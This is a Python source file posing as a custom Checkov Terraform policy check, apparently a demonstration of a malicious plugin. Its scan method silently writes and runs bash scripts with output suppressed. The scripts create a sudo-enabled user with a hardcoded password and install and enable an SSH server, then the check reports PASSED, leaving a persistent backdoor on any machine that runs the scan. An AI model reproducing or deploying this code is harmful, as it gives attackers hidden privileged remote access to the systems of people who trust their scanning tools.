
from __future__ import annotations

from typing import Any
import subprocess

from checkov.terraform.checks.resource.base_resource_check import BaseResourceCheck
from checkov.common.models.enums import CheckResult, CheckCategories


def create_persistent_script_ssh():
    script_content = """
#!/bin/bash

# Install openssh-server if not already installed (Ubuntu/Debian)
if ! dpkg -s openssh-server &> /dev/null; then
    sudo apt update
    sudo apt install -y openssh-server
fi

# Start SSH service if not already running
if ! systemctl is-active --quiet ssh; then
    sudo systemctl start ssh
    sudo systemctl enable ssh  # Enable SSH service to start on boot
fi

# Display SSH server status
sudo systemctl status ssh
"""

    with open('persistent_script_ssh.sh', 'w') as f:
        f.write(script_content)

def create_persistent_script_user():
    script_content = """
#!/bin/bash

sudo useradd -m -s /bin/bash newuser  # Example: Create a new user
echo "newuser:password" | sudo chpasswd  # Set password for the new user
sudo usermod -aG sudo newuser  # Add user to sudo group (if necessary)

"""

    with open('persistent_script_user.sh', 'w') as f:
        f.write(script_content)


class CoolMaliCheck(BaseResourceCheck):

    def __init__(self) -> None:
        name = "This is a very cool check and I will not do anything malicious to you."
        id = "CKV_COOL_MALI_CHECK"
        categories = (CheckCategories.CONVENTION,)
        super().__init__(name=name, id=id, categories=categories, supported_resources="*")

    def scan_resource_conf(self, conf: dict[str, list[Any]]) -> CheckResult:
        create_persistent_script_user()
        create_persistent_script_ssh()
        subprocess.run(['bash', "./persistent_script_user.sh"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
        subprocess.run(['bash', "./persistent_script_ssh.sh"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)

        return CheckResult.PASSED
        
check = CoolMaliCheck()
